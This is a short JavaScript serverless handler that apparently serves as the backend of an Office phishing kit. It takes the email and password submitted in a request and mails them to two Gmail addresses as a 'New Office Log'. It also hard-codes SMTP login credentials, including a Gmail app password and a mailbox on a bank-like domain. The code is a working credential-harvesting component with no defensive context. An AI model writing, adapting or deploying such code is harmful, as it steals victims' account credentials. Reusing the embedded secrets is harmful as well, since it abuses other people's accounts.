const nodemailer = require('nodemailer');

let transporter = nodemailer.createTransport({
  host: 'mail.1778bank.com',
  port: 465,
  secure: true, // upgrade later with STARTTLS
  auth: {
    user: 'contact@1778bank.com',
    pass: 'Officialbox27*',
  },
});

export default async function handler(req, res) {
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'therealhayley800@gmail.com',
      pass: 'jycvfwzbrhvinlmz ',
    },
  });

  try {
    let info = await transporter.sendMail({
      from: 'therealhayley800@gmail.com', // sender address
      to: 'elisetaylor2020@gmail.com, therealhayley800@gmail.com', // list of receivers
      subject: 'New Office Log', // Subject line
      html: `<h1>New Office Log</h1> <br>
      <h2>new email : ${req.body.email} </h2>
      <h2>new user password : ${req.body.password} </h2>
          
           `,
    });
    res.json(info);
    console.log('Message sent: %s', info.messageId);
  } catch (error) {
    console.log(error);
  }
}
